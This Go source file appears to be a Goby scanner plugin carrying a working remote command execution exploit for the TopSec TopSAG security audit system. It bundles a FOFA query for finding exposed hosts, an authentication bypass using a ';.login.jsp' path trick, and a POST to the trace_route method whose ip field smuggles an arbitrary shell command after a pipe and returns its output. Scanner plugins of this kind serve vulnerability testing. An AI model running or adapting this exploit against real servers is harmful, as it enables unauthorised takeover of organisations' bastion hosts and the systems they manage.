package exploits

import (
	"strings"

	"git.gobies.org/goby/goscanner/goutils"
	"git.gobies.org/goby/goscanner/jsonvul"
	"git.gobies.org/goby/goscanner/scanconfig"
	"git.gobies.org/goby/httpclient"
)

func init() {
	expJson := `{
    "Name": "TopSec TopSAG trace_route RCE",
    "Description": "<p>TopSec TopSAG Security Audit System (hereinafter referred to as \"Fortress Machine\") is a solution that combines O&amp;M management and compliance audit for the government, enterprises and institutions.</p><p>In terms of compliance audit, fortress machine through the centralized account management, high strength strengthening, the fine-grained authorization control and form more audit records, make the operation of the internal personnel, third party personnel is in tube, controllable and visible, careful, standardize the operational steps, avoid the wrong operation and unauthorized operation brings hidden trouble, Ensure the secure running and data usage of an organization's assets, such as servers, VMS, network devices, security devices, databases, and service systems.</p><p>The trace_route method has a command execution vulnerability, and the attacker can obtain the server permission through command splicing after bypassing the tomcat feature</p>",
    "Product": "TopSec TopSAG",
    "Homepage": "https://www.topsec.com.cn/product/173.html",
    "DisclosureDate": "2022-03-23",
    "Author": "1171373465@qq.com",
    "FofaQuery": "header=\"iam\" && server=\"Apache-Coyote/\"",
    "GobyQuery": "header=\"iam\" && server=\"Apache-Coyote/\"",
    "Level": "2",
    "Impact": "<p>Through this vulnerability, the attacker can arbitrarily execute the code on the server side, write the back door, obtain the server permission, and then control the whole Web server.</p>",
    "Recommendation": "<p>Vendor has released leaks fixes, please pay attention to update: <a href=\"https://www.topsec.com.cn\">https://www.topsec.com.cn</a></p>",
    "References": [
        "https://fofa.so"
    ],
    "Is0day": true,
    "HasExp": true,
    "ExpParams": [
        {
            "name": "Cmd",
            "type": "input",
            "value": "id"
        }
    ],
    "ExpTips": {
        "Type": "",
        "Content": ""
    },
    "ScanSteps": [
        "AND",
        {
            "Request": {
                "method": "GET",
                "uri": "/test.php",
                "follow_redirect": false,
                "header": {},
                "data_type": "text",
                "data": ""
            },
            "ResponseTest": {
                "type": "group",
                "operation": "AND",
                "checks": [
                    {
                        "type": "item",
                        "variable": "$code",
                        "operation": "==",
                        "value": "200",
                        "bz": ""
                    },
                    {
                        "type": "item",
                        "variable": "$body",
                        "operation": "contains",
                        "value": "",
                        "bz": ""
                    }
                ]
            },
            "SetVariable": []
        }
    ],
    "ExploitSteps": [
        "AND",
        {
            "Request": {
                "method": "GET",
                "uri": "/test.php",
                "follow_redirect": false,
                "header": {},
                "data_type": "text",
                "data": ""
            },
            "ResponseTest": {
                "type": "group",
                "operation": "AND",
                "checks": [
                    {
                        "type": "item",
                        "variable": "$code",
                        "operation": "==",
                        "value": "200",
                        "bz": ""
                    },
                    {
                        "type": "item",
                        "variable": "$body",
                        "operation": "contains",
                        "value": "",
                        "bz": ""
                    }
                ]
            },
            "SetVariable": []
        }
    ],
    "Tags": [
        "Command Execution"
    ],
    "VulType": [
        "Command Execution"
    ],
    "CVEIDs": [],
    "CNNVD": [],
    "CNVD": [],
    "CVSSScore": "10.0",
    "Translation": {
        "CN": {
            "Name": "天融信 运维安全审计系统 trace_route 远程命令执行漏洞",
            "Product": "天融信-运维安全审计系统",
            "Description": "<p>天融信运维安全审计系统（以下简称“堡垒机”）是面向政府、企事业单位等组织机构推出的兼具运维管理和合规审计的解决方案。在合规审计方面，堡垒机通过集中化账号管理、高强度认证加固、细粒度授权控制和多形式审计记录，使内部人员、第三方人员的操作处于可管、可控、可见、可审的状态下，规范运维的操作步骤，避免误操作和非授权操作带来的隐患，有效保障组织机构的服务器、虚拟机、网络设备、安全设备、数据库、业务系统等资产的安全运行和数据的安全使用。其中trace_route方法存在命令执行漏洞，攻击者通过Tomcat特性进行绕过后可以通过命令拼接获取服务器权限</p>",
            "Recommendation": "<p>厂商已发布了漏洞修复程序，请及时关注更新：<a href=\"https://www.topsec.com.cn/\">https://www.topsec.com.cn/</a><br></p>",
            "Impact": "<p>攻击者可通过该漏洞在服务器端任意执行代码，写入后门，获取服务器权限，进而控制整个web服务器。</p>",
            "VulType": [
                "命令执行"
            ],
            "Tags": [
                "命令执行"
            ]
        },
        "EN": {
            "Name": "TopSec TopSAG trace_route RCE",
            "Product": "TopSec TopSAG",
            "Description": "<p>TopSec TopSAG Security Audit System (hereinafter referred to as \"Fortress Machine\") is a solution that combines O&amp;M management and compliance audit for the government, enterprises and institutions.</p><p>In terms of compliance audit, fortress machine through the centralized account management, high strength strengthening, the fine-grained authorization control and form more audit records, make the operation of the internal personnel, third party personnel is in tube, controllable and visible, careful, standardize the operational steps, avoid the wrong operation and unauthorized operation brings hidden trouble, Ensure the secure running and data usage of an organization's assets, such as servers, VMS, network devices, security devices, databases, and service systems.</p><p>The trace_route method has a command execution vulnerability, and the attacker can obtain the server permission through command splicing after bypassing the tomcat feature</p>",
            "Recommendation": "<p>Vendor has released leaks fixes, please pay attention to update: <a href=\"https://www.topsec.com.cn\">https://www.topsec.com.cn</a><br></p>",
            "Impact": "<p>Through this vulnerability, the attacker can arbitrarily execute the code on the server side, write the back door, obtain the server permission, and then control the whole Web server.<br></p>",
            "VulType": [
                "Command Execution"
            ],
            "Tags": [
                "Command Execution"
            ]
        }
    },
    "AttackSurfaces": {
        "Application": null,
        "Support": null,
        "Service": null,
        "System": null,
        "Hardware": null
    },
    "PocId": "10755"
}`

	ExpManager.AddExploit(NewExploit(
		goutils.GetFileName(),
		expJson,
		func(exp *jsonvul.JsonVul, u *httpclient.FixUrl, ss *scanconfig.SingleScanConfig) bool {
			randHex := goutils.RandomHexString(16)
			uri := "/iam/synRequest.do;.login.jsp"
			cfg := httpclient.NewPostRequestConfig(uri)
			cfg.Data = "method=trace_route&w=1&ip=127.0.0.1|echo%20" + randHex + "%3b&m=10"
			cfg.VerifyTls = false
			cfg.FollowRedirect = false
			cfg.Header.Store("Content-type", "application/x-www-form-urlencoded")
			if resp, err := httpclient.DoHttpRequest(u, cfg); err == nil {
				return resp.StatusCode == 200 && strings.Contains(resp.RawBody, randHex)
			}
			return false
		},
		func(expResult *jsonvul.ExploitResult, ss *scanconfig.SingleScanConfig) *jsonvul.ExploitResult {
			cmd := ss.Params["Cmd"].(string)
			cmd = strings.Replace(cmd, " ", "%20", -1)
			uri := "/iam/synRequest.do;.login.jsp"
			cfg := httpclient.NewPostRequestConfig(uri)
			cfg.Data = "method=trace_route&w=1&ip=127.0.0.1|" + cmd + "%3b&m=10"
			cfg.VerifyTls = false
			cfg.FollowRedirect = false
			cfg.Header.Store("Content-type", "application/x-www-form-urlencoded")
			if resp, err := httpclient.DoHttpRequest(expResult.HostInfo, cfg); err == nil {
				if resp.StatusCode == 200 {
					expResult.Output = resp.RawBody
					expResult.Success = true
				}
			}
			return expResult
		},
	))
}